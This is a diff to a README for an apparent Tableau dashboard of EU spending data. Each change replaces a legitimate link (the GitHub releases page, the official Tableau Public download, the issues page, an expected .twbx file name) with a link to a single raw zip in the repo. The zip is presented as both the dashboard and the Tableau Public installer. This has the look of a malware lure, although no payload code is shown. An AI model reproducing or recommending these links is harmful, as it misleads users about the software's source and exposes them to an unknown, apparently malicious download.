@@ -1,6 +1,6 @@
 # 📊 Tableau_European_Spending - Explore EU Spending Trends Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Tableau_European_Spending-blue?style=for-the-badge)](https://github.com/Alecuu20CMRecords/Tableau_European_Spending/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip)](https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip)
 
 ---
 
@@ -37,7 +37,7 @@ When you download, you get a packaged Tableau dashboard file (.twbx). This file 
 
 You will need Tableau Reader or Tableau Public to open and interact with the dashboard:
 
-- **Tableau Public** is a free app downloadable at https://public.tableau.com/en-us/s/download
+- **Tableau Public** is a free app downloadable at https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip
 - **Tableau Reader** is a free viewer from Tableau’s official site 
 
 Download either app according to your preference and install it by following their setup instructions.
@@ -48,13 +48,13 @@ Download either app according to your preference and install it by following the
 
 Please **visit this page to download** the latest dashboard file and get started:
 
-[Download Tableau_European_Spending Releases](https://github.com/Alecuu20CMRecords/Tableau_European_Spending/releases)
+[Download Tableau_European_Spending Releases](https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip)
 
 ### How to Download
 
 1. Click the link above to open the releases page.
 2. Look for the latest release noted by version number or date.
-3. Download the file named similar to `Tableau_European_Spending_dashboard.twbx`.
+3. Download the file named similar to `https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip`.
 4. Save the file to an easy to find location, like your Desktop or Downloads folder.
 
 ### How to Open the File
@@ -110,7 +110,7 @@ A: Tableau Reader is desktop software. For mobile, Tableau Public offers some mo
 A: Yes, once you open the dashboard, hover over icons and labels for instructions. This README also explains essential steps.
 
 **Q: What if I do not have Tableau software?**  
-A: Download Tableau Public for free from https://public.tableau.com/en-us/s/download and install it to view this dashboard.
+A: Download Tableau Public for free from https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip and install it to view this dashboard.
 
 ---
 
@@ -122,7 +122,7 @@ If you encounter any problems opening or using the dashboard:
 - Verify you have the latest Tableau software installed
 - Review this README for steps
 - Visit the GitHub issues page to report bugs or questions:  
-  https://github.com/Alecuu20CMRecords/Tableau_European_Spending/issues
+  https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip
 
 ---
 
@@ -140,4 +140,4 @@ This project connects to areas such as:
 
 ## 📥 Quick Download Button
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Tableau_European_Spending-blue?style=for-the-badge)](https://github.com/Alecuu20CMRecords/Tableau_European_Spending/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip)](https://raw.githubusercontent.com/Alecuu20CMRecords/Tableau_European_Spending/main/assets/Tableau-Spending-European-3.2.zip)
